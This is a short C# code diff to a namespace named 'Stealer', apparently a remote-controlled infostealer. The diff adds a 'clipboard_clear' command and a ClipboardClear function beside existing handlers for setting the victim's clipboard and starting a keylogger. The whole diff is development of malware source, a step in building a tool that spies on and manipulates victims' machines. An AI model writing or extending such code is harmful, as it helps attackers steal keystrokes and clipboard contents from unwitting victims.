@@ -179,6 +179,10 @@ namespace Stealer
             {
                 ClipboardSet(cmd.Substring("clipboard_set:".Length));
             }
+            else if (cmdLower == "clipboard_clear")
+            {
+                ClipboardClear();
+            }
             // ── Keylogger ─────────────────────────────────────────────────────
             else if (cmdLower == "keylog_start")
             {
@@ -554,6 +558,23 @@ namespace Stealer
                         }
                         SetClipboardData(CF_UNICODETEXT, hMem);
                     }
+                    finally { CloseClipboard(); }
+                }
+                catch { }
+            });
+            t.SetApartmentState(ApartmentState.STA);
+            t.IsBackground = true;
+            t.Start();
+        }
+
+        private static void ClipboardClear()
+        {
+            var t = new Thread(() =>
+            {
+                try
+                {
+                    if (!OpenClipboard(IntPtr.Zero)) return;
+                    try { EmptyClipboard(); }
                     finally { CloseClipboard(); }
                 }
                 catch { }
